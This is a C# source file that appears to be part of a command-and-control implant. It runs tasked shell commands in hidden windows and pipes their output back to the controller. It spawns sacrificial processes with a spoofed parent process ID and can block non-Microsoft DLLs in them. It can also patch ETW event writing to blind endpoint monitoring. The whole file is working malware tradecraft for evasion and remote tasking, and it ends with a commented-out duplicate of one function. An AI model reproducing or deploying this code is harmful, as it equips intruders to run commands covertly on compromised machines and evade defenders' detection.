using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

using Microsoft.Win32.SafeHandles;

using Agent.Models;
using Agent.PInvoke;
using Agent.Controllers;

namespace Agent.Execution
{
    internal class LocalExecution
    {
        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
        const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
        const int STARTF_USESTDHANDLES = 0x00000100;
        const int STARTF_USESHOWWINDOW = 0x00000001;
        const short SW_HIDE = 0x0000;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
        const uint DUPLICATE_SAME_ACCESS = 0x00000002;

        internal static void CreateProcessForShellRun(AgentController agent, ConfigController config, string command, bool shell = false)
        {
            var result = string.Empty;

            var saHandles = new Win32.SECURITY_ATTRIBUTES();
            saHandles.nLength = Marshal.SizeOf(saHandles);
            saHandles.bInheritHandle = true;
            saHandles.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;
            var hDupStdOutWrite = IntPtr.Zero;

            Win32.Kernel32.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            Win32.Kernel32.SetHandleInformation(hStdOutRead, Win32.HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new Win32.PROCESS_INFORMATION();
            var siEx = new Win32.STARTUPINFOEX();

            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            var lpValueProc = IntPtr.Zero;

            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            try
            {
                var parentProcessId = (int)config.GetOption(ConfigurationSettings.PPID);

                var lpSize = IntPtr.Zero;
                Win32.Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Win32.Kernel32.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

                var parentHandle = Win32.Kernel32.OpenProcess(Win32.ProcessAccessFlags.CreateProcess | Win32.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);

                Win32.Kernel32.UpdateProcThreadAttribute(
                    siEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                var hCurrent = Process.GetCurrentProcess().Handle;
                var hNewParent = Win32.Kernel32.OpenProcess(Win32.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
                Win32.Kernel32.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);

                siEx.StartupInfo.hStdError = hDupStdOutWrite;
                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new Win32.SECURITY_ATTRIBUTES();
                var ts = new Win32.SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                var lpCommandLine = shell ? command.Insert(0, "cmd.exe /c ") : command;
                Win32.Kernel32.CreateProcess(null, lpCommandLine, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);

                ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////

                var safeHandle = new SafeFileHandle(hStdOutRead, false);
                var encoding = Encoding.GetEncoding(Win32.Kernel32.GetConsoleOutputCP());
                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
                var exit = false;

                try
                {
                    do
                    {
                        if (Win32.Kernel32.WaitForSingleObject(pInfo.hProcess, 100) == 0) { exit = true; }
                        char[] buf = null;
                        int bytesRead;
                        uint bytesToRead = 0;
                        var peekRet = Win32.Kernel32.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        if (peekRet == true && bytesToRead == 0)
                        {
                            if (exit == true) { break; }
                            else { continue; }
                        }

                        if (bytesToRead > 4096) { bytesToRead = 4096; }

                        buf = new char[bytesToRead];
                        bytesRead = reader.Read(buf, 0, buf.Length);

                        if (bytesRead > 0) { result += new string(buf); }

                    } while (true);

                    reader.Close();
                }
                catch (Exception e) { agent.SendError("stageone", "", e.Message); return; }
                finally
                {
                    if (!safeHandle.IsClosed) { safeHandle.Close(); }
                    if (hStdOutRead != IntPtr.Zero) { Win32.Kernel32.CloseHandle(hStdOutRead); }
                }
            }
            catch (Exception e) { agent.SendError("stageone", "", e.Message); return; }
            finally
            {
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    Win32.Kernel32.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }

                Marshal.FreeHGlobal(lpValueProc);

                if (pInfo.hProcess != IntPtr.Zero) { Win32.Kernel32.CloseHandle(pInfo.hProcess); }
                if (pInfo.hThread != IntPtr.Zero) { Win32.Kernel32.CloseHandle(pInfo.hThread); }
            }

            agent.SendCommandOutput(result);
        }

        internal static int CreateSpawnToProcess(AgentController agent, ConfigController config)
        {
            var blockDlls = (bool)config.GetOption(ConfigurationSettings.BlockDLLs);
            var dwAttributeCount = blockDlls ? 2 : 1;

            var saHandles = new Win32.SECURITY_ATTRIBUTES();
            saHandles.nLength = Marshal.SizeOf(saHandles);
            saHandles.bInheritHandle = true;
            saHandles.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;
            var hDupStdOutWrite = IntPtr.Zero;

            Win32.Kernel32.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            Win32.Kernel32.SetHandleInformation(hStdOutRead, Win32.HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new Win32.PROCESS_INFORMATION();
            var siEx = new Win32.STARTUPINFOEX();

            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            var lpValueProc = IntPtr.Zero;

            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            try
            {
                var parentProcessId = (int)config.GetOption(ConfigurationSettings.PPID);

                var lpSize = IntPtr.Zero;
                Win32.Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Win32.Kernel32.InitializeProcThreadAttributeList(siEx.lpAttributeList, dwAttributeCount, 0, ref lpSize);

                ///////////////////////////////////////////////////////////////////////////////////////////////////////

                if (blockDlls)
                {
                    var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                    Win32.Kernel32.UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                }

                ////////////////////////////////////////////////////////////////////////////////////////////////////////

                var parentHandle = Win32.Kernel32.OpenProcess(Win32.ProcessAccessFlags.CreateProcess | Win32.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);

                Win32.Kernel32.UpdateProcThreadAttribute(
                    siEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                var hCurrent = Process.GetCurrentProcess().Handle;
                var hNewParent = Win32.Kernel32.OpenProcess(Win32.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
                Win32.Kernel32.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);

                siEx.StartupInfo.hStdError = hDupStdOutWrite;
                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new Win32.SECURITY_ATTRIBUTES();
                var ts = new Win32.SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                var spawnTo = (string)config.GetOption(ConfigurationSettings.SpawnTo);

                Win32.Kernel32.CreateProcess(spawnTo, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);

                ///////////////////////////////

                if ((bool)config.GetOption(ConfigurationSettings.DisableETW))
                    RemoteExecution.PatchEtwEventWrite(pInfo.hProcess);

                ///////////////////////////////

                var safeHandle = new SafeFileHandle(hStdOutRead, false);
                var encoding = Encoding.GetEncoding(Win32.Kernel32.GetConsoleOutputCP());
                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
                var exit = false;

                var t = new Thread(() =>
                {
                    var output = string.Empty;

                    try
                    {
                        do
                        {
                            if (Win32.Kernel32.WaitForSingleObject(pInfo.hProcess, 100) == 0) { exit = true; }
                            char[] buf = null;
                            int bytesRead;
                            uint bytesToRead = 0;
                            var peekRet = Win32.Kernel32.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                            if (peekRet == true && bytesToRead == 0)
                            {
                                if (exit == true) { break; }
                                else { continue; }
                            }

                            if (bytesToRead > 4096) { bytesToRead = 4096; }

                            buf = new char[bytesToRead];
                            bytesRead = reader.Read(buf, 0, buf.Length);

                            if (bytesRead > 0) { output += new string(buf); }

                        } while (true);

                        reader.Close();

                        agent.SendCommandOutput(output);
                    }
                    catch { }
                    finally
                    {
                        if (!safeHandle.IsClosed) { safeHandle.Close(); }
                        if (hStdOutRead != IntPtr.Zero) { Win32.Kernel32.CloseHandle(hStdOutRead); }
                    }
                });

                t.Start();
            }
            catch { }
            finally
            {
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    Win32.Kernel32.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }

                Marshal.FreeHGlobal(lpValueProc);

                if (pInfo.hProcess != IntPtr.Zero) { Win32.Kernel32.CloseHandle(pInfo.hProcess); }
                if (pInfo.hThread != IntPtr.Zero) { Win32.Kernel32.CloseHandle(pInfo.hThread); }
            }

            return pInfo.dwProcessId;
        }

        //internal static int CreateSpawnToProcess(ConfigurationController config)
        //{
        //    var result = string.Empty;

        //    var saHandles = new Win32.SECURITY_ATTRIBUTES();
        //    saHandles.nLength = Marshal.SizeOf(saHandles);
        //    saHandles.bInheritHandle = true;
        //    saHandles.lpSecurityDescriptor = IntPtr.Zero;

        //    IntPtr hStdOutRead;
        //    IntPtr hStdOutWrite;
        //    var hDupStdOutWrite = IntPtr.Zero;

        //    Win32.Kernel32.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
        //    Win32.Kernel32.SetHandleInformation(hStdOutRead, Win32.HANDLE_FLAGS.INHERIT, 0);

        //    var blockDlls = (bool)config.GetOption(ConfigurationSettings.BlockDLLs);
        //    var dwAttributeCount = blockDlls ? 2 : 1;

        //    var pInfo = new Win32.PROCESS_INFORMATION();
        //    var siEx = new Win32.STARTUPINFOEX();

        //    siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
        //    siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        //    siEx.StartupInfo.wShowWindow = SW_HIDE;

        //    var lpValueProc = IntPtr.Zero;

        //    try
        //    {
        //        var parentProcessId = (int)config.GetOption(ConfigurationSettings.PPID);

        //        var lpSize = IntPtr.Zero;
        //        Win32.Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
        //        siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        //        Win32.Kernel32.InitializeProcThreadAttributeList(siEx.lpAttributeList, dwAttributeCount, 0, ref lpSize);

        //        ///////////////////////////////////////////////////////////////////////////////////////////////

        //        if (blockDlls)
        //        {
        //            var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
        //            Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

        //            Win32.Kernel32.UpdateProcThreadAttribute(
        //                siEx.lpAttributeList,
        //                0,
        //                (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
        //                lpMitigationPolicy,
        //                (IntPtr)IntPtr.Size,
        //                IntPtr.Zero,
        //                IntPtr.Zero);
        //        }

        //        ////////////////////////////////////////////////////////////////////////////////////////////////

        //        var parentHandle = Win32.Kernel32.OpenProcess(Win32.ProcessAccessFlags.CreateProcess | Win32.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
        //        lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
        //        Marshal.WriteIntPtr(lpValueProc, parentHandle);

        //        Win32.Kernel32.UpdateProcThreadAttribute(
        //            siEx.lpAttributeList,
        //            0,
        //            (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        //            lpValueProc,
        //            (IntPtr)IntPtr.Size,
        //            IntPtr.Zero,
        //            IntPtr.Zero);

        //        var hCurrent = Process.GetCurrentProcess().Handle;
        //        var hNewParent = Win32.Kernel32.OpenProcess(Win32.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
        //        Win32.Kernel32.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);

        //        siEx.StartupInfo.hStdError = hDupStdOutWrite;
        //        siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
        //        siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        //        siEx.StartupInfo.wShowWindow = SW_HIDE;

        //        var ps = new Win32.SECURITY_ATTRIBUTES();
        //        var ts = new Win32.SECURITY_ATTRIBUTES();
        //        ps.nLength = Marshal.SizeOf(ps);
        //        ts.nLength = Marshal.SizeOf(ts);

        //        var spawnTo = (string)config.GetOption(ConfigurationSettings.SpawnTo);
        //        Win32.Kernel32.CreateProcess(spawnTo, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);

        //        ///////////////////////////////

        //        if ((bool)config.GetOption(ConfigurationSettings.DisableETW))
        //            RemoteExecution.PatchEtwEventWrite(pInfo.hProcess);

        //        ///////////////////////////////

        //        var safeHandle = new SafeFileHandle(hStdOutRead, false);
        //        var encoding = Encoding.GetEncoding(Win32.Kernel32.GetConsoleOutputCP());
        //        var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
        //        var exit = false;

        //        var t = new Thread(() =>
        //        {
        //            try
        //            {
        //                do
        //                {
        //                    if (Win32.Kernel32.WaitForSingleObject(pInfo.hProcess, 100) == 0) { exit = true; }
        //                    char[] buf = null;
        //                    int bytesRead;
        //                    uint bytesToRead = 0;
        //                    var peekRet = Win32.Kernel32.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

        //                    if (peekRet == true && bytesToRead == 0)
        //                    {
        //                        if (exit == true) { break; }
        //                        else { continue; }
        //                    }

        //                    if (bytesToRead > 4096) { bytesToRead = 4096; }

        //                    buf = new char[bytesToRead];
        //                    bytesRead = reader.Read(buf, 0, buf.Length);

        //                    if (bytesRead > 0) { result += new string(buf); }

        //                } while (true);

        //                reader.Close();
        //            }
        //            finally
        //            {
        //                if (!safeHandle.IsClosed) { safeHandle.Close(); }
        //                if (hStdOutRead != IntPtr.Zero) { Win32.Kernel32.CloseHandle(hStdOutRead); }
        //            }
        //        });
        //    }
        //    finally
        //    {
        //        if (siEx.lpAttributeList != IntPtr.Zero)
        //        {
        //            Win32.Kernel32.DeleteProcThreadAttributeList(siEx.lpAttributeList);
        //            Marshal.FreeHGlobal(siEx.lpAttributeList);
        //        }

        //        Marshal.FreeHGlobal(lpValueProc);

        //        if (pInfo.hProcess != IntPtr.Zero) { Win32.Kernel32.CloseHandle(pInfo.hProcess); }
        //        if (pInfo.hThread != IntPtr.Zero) { Win32.Kernel32.CloseHandle(pInfo.hThread); }
        //    }

        //    return pInfo.dwProcessId;
        //}
    }
}